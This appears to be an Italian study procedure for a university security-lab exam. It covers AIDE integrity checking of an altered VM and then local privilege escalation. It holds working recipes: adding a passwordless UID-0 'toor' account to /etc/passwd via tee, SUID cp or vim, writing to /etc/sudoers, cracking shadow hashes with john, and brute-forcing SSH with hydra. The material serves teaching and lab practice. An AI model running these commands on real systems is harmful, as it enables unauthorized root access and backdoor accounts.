# Procedura Operativa — Integrity Check & Privilege Escalation

> Sequenza fissa di azioni/comandi da eseguire per qualunque esercizio di questa famiglia
> (binario `changeN` o pacchetto `.deb`/`.deb.gz`/`.deb.gpg` che altera file in `/usr/bin` e
> `/etc`). Non contiene teoria — solo l'algoritmo operativo. Per il ragionamento sui vettori vedi
> `guida_esame_privesc.md`; per esempi completi già risolti, `modello_integrity_privesc.md`.

> ⚠️ **Regola d'oro: il database "pulito" va creato PRIMA di eseguire il file fornito, mai dopo.**
> Se lanci `changeN`/installi il `.deb` prima di aver fatto la baseline con `aideinit`, hai perso:
> AIDE non ha più uno stato "sano" con cui confrontare. Se ti accorgi di averlo fatto, ricrea la VM
> pulita (le consegne più recenti lo dicono esplicitamente: "usare una VM mai alterata").

> ⚠️ **Seconda regola d'oro: non fermarti al primo file che AIDE segnala.** Il pacchetto realistico
> introduce **più modifiche insieme** e quasi sempre **una sola è sfruttabile**; le altre sono
> vicoli ciechi (capability inutili, ACL su binari senza privilegi, falsi positivi, SGID su gruppi
> di cui non fai parte). Analizza **ogni** riga del diff prima di scegliere il vettore. Il criterio
> per distinguerle è al passo 6.

## 0. Prima di toccare qualsiasi cosa

- [ ] **Leggi tutta la consegna.** Nota: (a) cosa chiede la Fase 2 esatta — `toor` senza password?
  con password data? "diventare root e basta"? cambia i deliverable; (b) se dice "senza usare il
  potere sudo di `kali`" (quasi sempre) — significa che devi trovare un vettore che **non** passi
  per `sudo <qualcosa>` come `kali`; (c) i deliverable: tipicamente `integrity.txt` (Fase 1) +
  `privesc.png` (Fase 2, uno o più: `privesc1.png`, `privesc2.png`, …).
- [ ] Se la consegna consiglia una "VM mai alterata", usala: alcuni esercizi assumono uno stato di
  partenza pulito e residui di lab precedenti falsano il diff AIDE.

## 1. Configurare AIDE (col gotcha sull'ordine e su `/usr/bin`)

- [ ] **AIDE è installato?** `which aide`. Se manca (e `/etc/aide/` non esiste), installalo prima:
  `sudo apt install aide`. Su questa VM Parrot/Kali AIDE **non è preinstallato di default**
  (troubleshooting_vm.md §S11). Senza, il passo 1 non parte.

Apri il config come root:
```
sudo nano /etc/aide/aide.conf
```
- [ ] **Commenta l'inclusione automatica** in fondo al file (rende la scansione lentissima e la
  copertura imprevedibile):
```
# @@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$
```
- [ ] **Aggiungi esplicitamente le directory da monitorare.** La config di default **non copre
  `/usr/bin` in modalità Full** — se non lo aggiungi, le modifiche ai binari non vengono rilevate.
  Il pacchetto tocca sempre `/usr/bin` e `/etc`:
```
/usr/bin  f  Full
/etc      f  Full
```
  ⚠️ **Sintassi: tre token separati da spazi, `<percorso> f Full`. Si scrive `f`, MAI `-f`**
  (`/usr/bin -f Full` col trattino è un errore ricorrente: la riga non seleziona i file e i binari
  non finiscono nel confronto).
  `f` = applica la regola ai file (non alle directory come tali); `Full` = preset esteso (permessi,
  owner/group, size, mtime/ctime, hash multipli, **xattrs** — indispensabile perché le capability
  vivono nell'xattr `security.capability`). Variante equivalente vista nelle soluzioni ufficiali:
  definire una regola custom `SecLabRule = p+n+u+g+s+m+c+xattrs+md5+sha512` e usarla
  (`/usr/bin SecLabRule`, `/etc SecLabRule`).
- [ ] **Verifica la sintassi del config** prima di procedere:
```
sudo aide -c /etc/aide/aide.conf --config-check     # oppure -C su sistema ancora pulito: 0 differenze attese
```

## 2. Creare la baseline (database "pulito")

```
sudo aideinit
```
- `aideinit` crea il database `database_out` (di default `/var/lib/aide/aide.db.new`) e, **solo se
  non esiste già** il `database_in` (`/var/lib/aide/aide.db`), ce lo copia identico.
- [ ] **Verifica/forza la copia a mano** — è il punto in cui più spesso il confronto poi "non
  rileva nulla": se `aide.db` esiste già da un test precedente, `aideinit` **non** lo sovrascrive.
```
sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
```
  (Se nel config hai puntato `database_in`/`database_out` a un percorso tuo, es.
  `/home/kali/aide/aide.db`, copia quelli: `cp ~/aide/aide.db{.new,}`.)

## 3. Eseguire il file fornito

A seconda del formato:
```
# binario changeN:
chmod +x ./changeN
sudo ./changeN

# pacchetto .deb.gz:
gunzip esame_AAAA.MM.GG_all.deb.gz
sudo dpkg -i esame_AAAA.MM.GG_all.deb

# pacchetto .deb.gpg (password tipica: "esame"):
gpg -d esame_AAAA.MM.GG_all.deb.gpg > e.deb
sudo dpkg -i e.deb
```
Questo `sudo` è l'unico consentito: è l'"installazione" richiesta dalla consegna, non l'exploit.

## 4. Confrontare (diff AIDE)

```
sudo aide -C -c /etc/aide/aide.conf     # -C = Check: filesystem attuale vs database_in
```
(AIDE esige `-c <config>` anche in Check; se hai usato un config custom, `sudo aide -c ~/aide/aide.conf -C`.)

## 5. Leggere il diff — legenda della riga di sintesi

Ogni entry modificata ha una riga tipo `f >.... mc..H.. .+ : /percorso`. Come si legge:
- **`f`** = file (`d` = directory).
- Colonna 2: `=` attributo invariato, `>` cresciuto (es. size aumentata → contenuto appeso),
  `<` diminuito.
- Le lettere che seguono sono gli attributi **cambiati** (assenti se invariati): `p`=permessi,
  `u`=uid/owner, `g`=gid/group, `s`=size, `m`=mtime, `c`=**ctime** (cambia praticamente sempre:
  da solo non significa nulla), `H`=hash, `A`=**ACL**, `X`=**xattrs** (capability!), `+`=xattr
  aggiunto.
- Poi la sezione "Detailed information about changes" mostra, per ogni file, i valori
  **prima | dopo**. È lì che leggi *cosa* è cambiato davvero.

Segnali che contano (ignora il `c`/ctime isolato e l'`m`/mtime isolato):
- **`X`/`+` su un binario di `/usr/bin`** → capability aggiunta → verifica con `getcap`.
- **`A` (ACL)** su un file → verifica con `getfacl`.
- **`p` (permessi)** su un binario → può essere un SUID nuovo (`ls -l`: cerca la `s`).
- **`>` su `/etc/passwd`, `/etc/shadow`, `/etc/group`** → contenuto appeso → nuovi utenti/gruppi.
- **entry `ADDED`** (es. un nuovo file in `/etc/sudoers.d/`) → leggilo, spesso è una regola sudo.

## 6. Distinguere il vettore sfruttabile dai vicoli ciechi

Per **ogni** file segnalato, applica il comando di verifica giusto e chiediti "questo mi avvicina a
root?". Casi reali già visti nel pool (dettagli in `guida_esame_privesc.md`):

| Cosa vedi nel diff | Comando di verifica | È un vicolo cieco se… |
|---|---|---|
| `X`/`+` su binario | `getcap <file>` | capability vuota (falso positivo, `mycapfake`), o capability reale ma inutile (`cap_mknod`, `cap_audit_read`), o il binario non serve a scrivere file |
| `A` (ACL) su binario | `getfacl <file>` | l'ACL dà accesso a un binario che **di suo non ha privilegi speciali** (es. `mknod`, `chmod` senza CAP_FOWNER) |
| `p` = SUID nuovo | `ls -l <file>` (cerca `s`) | il binario non può aprire/scrivere file utili come root (es. `yes`, `whoami`) |
| ACL/SGID su directory | `getfacl` / `ls -ld` | SGID per un gruppo di cui **non fai parte** |
| solo `c` (ctime) o `m` | — | quasi sempre rumore/ripristino: nessuna modifica sostanziale sopravvissuta |

Vettori che invece **sono** sfruttabili (uno di questi è quasi sempre "quello vero"):
- `cap_dac_override` su un **editor** (`vim.tiny`, `vim.basic`) o su `tee` → scrive qualunque file.
- `cap_fowner` su `chmod` → può cambiare permessi/SUID di file altrui → fabbrica un secondo vettore.
- **SUID** su `cp`/`tee`/un editor → scrive file protetti come root.
- Nuovo **utente senza password** in `/etc/passwd` (secondo campo vuoto) → login libero.
- **ACL di scrittura** su `/etc/sudoers` o `/etc/passwd` → l'utente si auto-promuove.
- Regola **sudoers** permissiva (`NOPASSWD` su un binario utile, o **wildcard** `*` sfruttabile).

Se il vettore richiede un utente protetto da password:
- **Se puoi leggere `/etc/shadow`** (ACL di lettura, o un comando che te lo fa `cat` come root):
  `unshadow /etc/passwd /etc/shadow > f; john -format=crypt -wordlist=/usr/share/wordlists/rockyou.txt f`.
- **Se NON puoi leggere shadow**: attacco *online* con `hydra -l <user> -P .../rockyou.txt ssh://localhost`.

## 7. Sfruttare il vettore trovato (ricette)

**cap_dac_override su editor (vim.tiny/vim.basic) o SUID/cap su tee**
```
# editor: apri /etc/passwd e aggiungi/edita la riga; salva forzando (il DAC è bypassato)
vim.tiny /etc/passwd            #  toor::0:0::/root:/bin/bash   (campo pw vuoto)  →  :w!
# oppure via tee (cap_dac_override o SUID):
echo "toor::0:0::/root:/bin/bash" | tee -a /etc/passwd
su toor
```
⚠️ **Con tee usa SEMPRE la pipe, mai il redirect.** `echo "…" >> /etc/passwd` fallisce **sempre**
con *Permission denied* anche se tee ha la capability/SUID: il redirect `>>`/`>` lo apre la **shell**
(coi permessi non privilegiati di `kali`), non tee. Il privilegio si attiva solo quando è il binario
a fare la `open()`, quindi il contenuto va in **pipe** e il file protetto è un **argomento** di tee.
Stesso motivo per cui con `cp` SUID si fa `cp file /etc/passwd` (è cp ad aprire), non `cat > /etc/passwd`.

**SUID su cp** (o cap_fowner su chmod → `chmod u+s /usr/bin/cp` per crearlo)
```
cp /etc/passwd ~/p ; cat ~/p > ~/passwd            # cat > per una copia scrivibile dall'utente
echo "toor::0:0::/root:/bin/bash" >> ~/passwd
cp ~/passwd /etc/passwd                            # cp SUID scrive come root
su toor
```

**Utente senza password + ACL su /etc/sudoers**
```
su intruso                                          # nessuna password
echo 'intruso ALL=(ALL:ALL) ALL' | tee -a /etc/sudoers   # ACL consente la scrittura
sudo -i
```

**sudoers NOPASSWD su un binario (eventualmente dopo brute-force)**
```
su - spy                                            # password ottenuta con hydra/john
sudo -l                                             # conferma cosa può fare come root
echo "toor::0:0::/root:/bin/bash" | sudo /usr/bin/tee -a /etc/passwd
su - toor
```

**Cambiare un UID a 0** (quando hai un editor privilegiato e un utente-ponte senza password)
```
vim.tiny /etc/passwd            # metti a 0 l'UID di un utente passwordless (es. searcher)
su searcher                     # ora è root
```

- [ ] **Prova finale sempre uguale:** `id` deve dare `uid=0(root)`. È lo screenshot da catturare.
- Se scegli la password inline nel secondo campo di `/etc/passwd`, generala con
  `openssl passwd -1 -salt <salt> <pw>` (MD5-crypt) o `openssl passwd -6 …` (SHA-512) e incollala
  al posto della `x`; se lasci il campo **vuoto**, nessuna password sarà richiesta.

## 8. Produrre i deliverable

- [ ] **`integrity.txt`** (Fase 1, sempre richiesto): documenta *in modo dettagliato* la strategia —
  come hai configurato AIDE (con le righe aggiunte/commentate), i comandi di baseline e confronto,
  l'**output del diff AIDE** (incollalo), l'analisi file-per-file con la distinzione
  sfruttabile/vicolo-cieco (è la parte che vale il voto: dimostra il ragionamento, non solo il
  risultato), e la strategia di exploit. Le soluzioni ufficiali incollano l'intero output di AIDE
  in fondo al file: fallo anche tu.
- [ ] **`privesc.png`** (Fase 2): screenshot dei comandi dell'exploit **e** dell'output finale
  (`id` → `uid=0(root)` o il prompt `root@…#`). Se i passi sono tanti, numera più screenshot
  (`privesc1.png`, `privesc2.png`, …) — la consegna lo consente esplicitamente.
- [ ] Verifica caso per caso la Fase 2 della **consegna specifica**: alcune chiedono un utente con
  nome/password precisi (`hack`/`hack`, `toor`/`gotRoot`), altre solo "diventare root". Rispetta il
  nome/la password richiesti se indicati.

## 9. Comandi di scoperta "a tappeto" (se il diff AIDE non basta o per conferma)

```
find / -perm /7000 2>/dev/null          # tutti i file con un bit speciale (SUID 4000 / SGID 2000 / sticky 1000)
/usr/sbin/getcap -r / 2>/dev/null        # tutti i file con capability
getfacl -sR / 2>/dev/null                # tutti i file con ACL non standard
```
Utili per confermare che non ti sia sfuggito un vettore fuori da `/usr/bin`/`/etc`, o quando la
consegna dice "più eventualmente altre da dedurre".
